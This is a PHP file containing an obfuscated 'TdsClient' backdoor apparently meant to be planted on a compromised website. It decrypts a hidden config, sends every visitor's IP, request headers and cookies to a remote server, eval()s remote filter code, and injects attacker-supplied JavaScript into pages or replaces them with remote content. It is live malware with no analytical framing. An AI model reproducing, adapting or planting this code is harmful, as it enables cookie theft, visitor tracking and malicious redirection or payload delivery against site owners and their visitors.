<?php
if (!defined('file_get_contents '))
{
    define('file_get_contents ', 1);

    class TdsClient
    {
        private $config;
        private $config_dict;

        public function __construct($config, $uid)
        {
            $this->config = $config;
            $this->uid = $uid;
        }

        private function _get_config()
        {
            if (empty($this->config_dict))
            {
                $this->config_dict = @unserialize($this->_decrypt(TdsClient::b64d($this->config), "tmnyrbtvchx5bny"));
            }

            return $this->config_dict;
        }

        private function _http_query_curl($url, $content)
        {
            if (!function_exists('curl_version'))
            {
                return "";
            }

            $ch = curl_init();

            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 3);
            curl_setopt($ch, CURLOPT_TIMEOUT, 10);

            if (!empty($content))
            {
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, $content);
            }

            curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);

            $server_output = curl_exec($ch);
            curl_close($ch);

            return $server_output;
        }

        private function _http_query_native($url, $content)
        {
            $context = Array('http' => Array(
                'method' => 'GET',
                'timeout' => 10,
                'ignore_errors' => true));

            if (!empty($content))
            {
                $context['http']['method'] = 'POST';
                $context['http']['header'] = 'Content-type: application/x-www-form-urlencoded';
                $context['http']['content'] = $content;
                $context['http']['timeout'] = 10;
            }
            $context = stream_context_create($context);

            return @file_get_contents($url, FALSE, $context);
        }

        private function _http_query($url, $query)
        {
            $url = str_replace("[URL]", "77.87.193.14", $url);

            $content = $this->_http_query_curl($url, $query);
            if (!$content)
            {
                $content = $this->_http_query_native($url, $query);
            }

            return $content;
        }

        private function _get_request_ip()
        {
            $ip_keys = array('REMOTE_ADDR', );
            foreach ($ip_keys as $key)
            {
                if (array_key_exists($key, $_SERVER) === TRUE)
                {
                    foreach (explode(',', $_SERVER[$key]) as $ip)
                    {
                        $ip = trim($ip);
                        if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== FALSE)
                        {
                            return $ip;
                        }
                    }
                }
            }

            return "";
        }

        private function _query()
        {
            $tds_config = $this->_get_config();

            $ip = $tds_config["tds_ip"];
            $port = $tds_config["tds_port"];
            $path = $tds_config["tds_path"];

            $route = "yor8afx3";
            if (!empty($tds_config["route"]))
            {
                $route = $tds_config["route"];
            }

            $query = Array();
            $query['i'] = $this->_get_request_ip();
            $query['p'] = @$_SERVER['HTTP_HOST'] . @$_SERVER['REQUEST_URI'];
            $query['u'] = @$_SERVER['HTTP_USER_AGENT'];
            $query['a'] = @$_SERVER['HTTP_ACCEPT_LANGUAGE'];
            $query['r'] = @$_SERVER['HTTP_REFERER'];
            $query['ae'] = @$_SERVER['HTTP_ACCEPT_ENCODING'];
            $query['aa'] = @$_SERVER['HTTP_ACCEPT'];
            $query['ac'] = @$_SERVER['HTTP_ACCEPT_CHARSET'];
            $query['c'] = @$_SERVER['HTTP_CONNECTION'];
            if (isset($_SERVER['HTTP_CF_CONNECTING_IP']))
            {
                $query['cfi'] = @$_SERVER['HTTP_CF_CONNECTING_IP'];
            }
            if (isset($_SERVER['HTTP_X_REAL_IP']))
            {
                $query['xri'] = @$_SERVER['HTTP_X_REAL_IP'];
            }
            if (isset($_SERVER['HTTP_X_FORWARDED_FOR']))
            {
                $query['xff'] = @$_SERVER['HTTP_X_FORWARDED_FOR'];
            }
            $query['co'] = @serialize(@$_COOKIE);
            $query['cp'] = serialize(Array("a"=>$route, "uid"=>$this->uid));

            $query = http_build_query($query);
            $url = "http://" . $ip . ":" . $port . $path;

            return $this->_http_query($url, $query);
        }

        public function process_request()
        {
            $content = @unserialize($this->_query());

            if (isset($content["options"]))
            {
                foreach ($content["cookies"] as $key => $value_and_ttl)
                {
                    @setcookie($key, $value_and_ttl[0], time() + $value_and_ttl[0], "/", $_SERVER['HTTP_HOST']);
                }

                if (isset($content["options"]["type"]) && $content["options"]["type"]=="inject")
                {
                    $GLOBALS['injectable_js_code'] = TdsClient::b64d($content["data"]);
                    ob_start("TdsClient::postrender_handler");
                }
                else
                {
                    foreach ($content["headers"] as $key => $value)
                    {
                        @header("$key: $value");
                    }

                    if (strlen($content["data"]) != 0)
                    {
                        exit(TdsClient::b64d($content["data"])); # TODO: check if its file
                    }
                }
            }
        }

        public function try_process_check_request()
        {
            foreach (array_merge($_COOKIE, $_POST) as $data_key => $data)
            {
                $data = @unserialize($this->_decrypt(TdsClient::b64d($data), $data_key));

                if (isset($data['ak']) && $this->uid==$data['ak'])
                {
                    if ($data['sa'] == 'check')
                    {
                        return TRUE;
                    }
                }
            }

            return FALSE;
        }

        public function can_process_request()
        {
            $tds_config = $this->_get_config();

            eval("function is_acceptable_tds_request(){\n" . $tds_config["tds_filter"] . "\n}");

            if (function_exists("is_acceptable_tds_request"))
            {
                if (!is_acceptable_tds_request())
                {
                    return FALSE;
                }
            }

            return TRUE;
        }

        static public function postrender_handler($buffer)
        {
            // prepare page content
            $content = $buffer;
            $js_code = $GLOBALS['injectable_js_code'];

            if (strpos(strtolower($content), "</head>") !== FALSE)
            {
                $content = str_replace("</head>", $js_code . "\n" . "</head>", $content);
            }
            elseif (strpos(strtolower($content), "</body>") !== FALSE)
            {
                $content = str_replace("</body>", $js_code . "\n" . "</body>", $content);
            }

            return $content;
        }

        private function _decrypt_phase($data, $key)
        {
            $out_data = "";

            for ($i = 0; $i < strlen($data);) {
                for ($j = 0; $j < strlen($key) && $i < strlen($data); $j++, $i++) {
                    $out_data .= chr(ord($data[$i]) ^ ord($key[$j]));
                }
            }

            return $out_data;
        }

        private function _decrypt($data, $key)
        {
            return $this->_decrypt_phase($this->_decrypt_phase($data, $key), $this->uid);
        }

        public function b64d($input)
        {
            if (strlen($input) < 4)
            {
                return "";
            }

            $keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";

            $keys = str_split($keyStr);
            $keys = array_flip($keys);

            $i = 0;
            $output = "";

            $input = preg_replace("~[^A-Za-z0-9\+\/\=]~", "", $input);

            do {
                $enc1 = $keys[$input[$i++]];
                $enc2 = $keys[$input[$i++]];
                $enc3 = $keys[$input[$i++]];
                $enc4 = $keys[$input[$i++]];

                $chr1 = ($enc1 << 2) | ($enc2 >> 4);
                $chr2 = (($enc2 & 15) << 4) | ($enc3 >> 2);
                $chr3 = (($enc3 & 3) << 6) | $enc4;
                $output = $output . chr($chr1);
                if ($enc3 != 64) {
                    $output = $output . chr($chr2);
                }
                if ($enc4 != 64) {
                    $output = $output . chr($chr3);
                }
            } while ($i < strlen($input));
            return $output;
        }
    }

    $uid = 'dcfeb6d2-c019-4cf0-b1f5-6e7298d3a385';
    $config = 'cTQ9JmsnKnF0KTprLjcoNTAtbihpMHR3Z35xNj4qMmV8cHJtMmFhfkVzaS4gNWYsem1sNShjZyF3PmpkeCotLzgFdixuLyVyJDZsKzZqKnptfiByeXFeUk0bD0oNRGAdB0IBHxJZWRBdEx0UWTZZMTVoLG1fRApvbTwmOnE/KWArJmlHB04cEBEERmZLExoGU1oQREkfRAAPWwwUGBoQTjlYZiw0bngwO2UlKTxzKBQHFAQaVVxTPlgARBQRWQ1CHhEIRSkDeDB3TRALDEtHAgxjWApbGhUfX0ZRL0cqJn1pKn0ZARMFUjleT2EJDnt0YigrLj8vYisiHQFMVUgkHAUlEEpCHS80cX1kbHg9ICd7QBQKEEURCBoqTglMFwoOTlRWTlUSSQRMJgNhbTwmOmQgPHMNYyxsN2NmYXt+ZCBtIysubnQne24ueTs2aTI6KT4ld393LGQhZD0xM2MnJywwcCgmMCEgdXx0e387dygrdyV3NSEiY3cnJ3UyYCAmIm5nMSUieCJtIyQwbHR2ZmZqaDgxbzgtPDI3fXUgMXNneCg3I2Y3LjkmYzVrPyVyemt+cmo6ci8kawQ9JXwuaC9leSsATAIdFFYGAWZFUglIGAAIWENbUFMQQh4/XHdhQEohFx5yeTRyfChsIXkgZhIXURJGfENccRZZCgYpfy0meyE7bXM2eWxkNiRvPQRtLGQmaWh3LGx7DXg/Z2gnOzx0N2sSJSl3MztiMCd+cz8PPCchPWUtd3thN3FTZC44czoiITokKQB6bzEsb3h6Nzd8GTR8aCgsbS91a2x1TGt6NiwvISE/NiAEMyo/cGl1fXUmLlRnKWs5MGBjYjR7Bm99aDo3YHl7Oj5YP3M8amU/LX5vYhx0c3c9djN+Lmo3CCUkNXtxMWEkaBJ4eGMnKCtjMHhseygyNXRwJz4iYG86fTYfYWc9NmB8IGtzfiE8TCNkc3c9fhhgeyB0dGRhNyxxCD8kYh9jN3NhPCIldS1TZWVwPDUiIkYscSwIOjw7LTY4ODd/ZT0rWHQ1JmUwJRd1P2Iue2cvWiJoYVN1fi8hYyM8JQkuLi9leShwQ2guJn49NCh+ci95MzopQT4rNjh1K2VoaS4lNCE+d308dn11Im0/e3MjKiYmfh0tNyYmIzx/JytgTHAlfyc3EXR4LDIlZiwpYXhnPXIyIzdyAUEvXFxsMC4odXZ0ODQ8bi9bNiI5dGN2cGI2dSY2cj1CdAgSVQxZDxgMN0dAXE9GVQgLQg8WZwJ/Ph1ZZTokJCBZSCh5a2t6MGUiKSV0c39xMUkZURMKLEtYcXUhIXVEU3JSFUpFMHYgLzNjJglKEhBgPyp3KyxvLj58cgE4LDQyOC8hYyViNG83OGQpLzp4bSlzZXUlNi1pJXgrYwAqamBoPmFmOSQnfjRwPGxzYSZjaH1iLnAp';

    $client = new TdsClient($config, $uid);

    if ($client->try_process_check_request())
    {
        echo "<tds>".PHP_EOL;
        echo $uid;
        echo "</tds>".PHP_EOL;
    }
    else
    {
        if ($client->can_process_request())
        {
            $client->process_request();
        }
    }
}
)
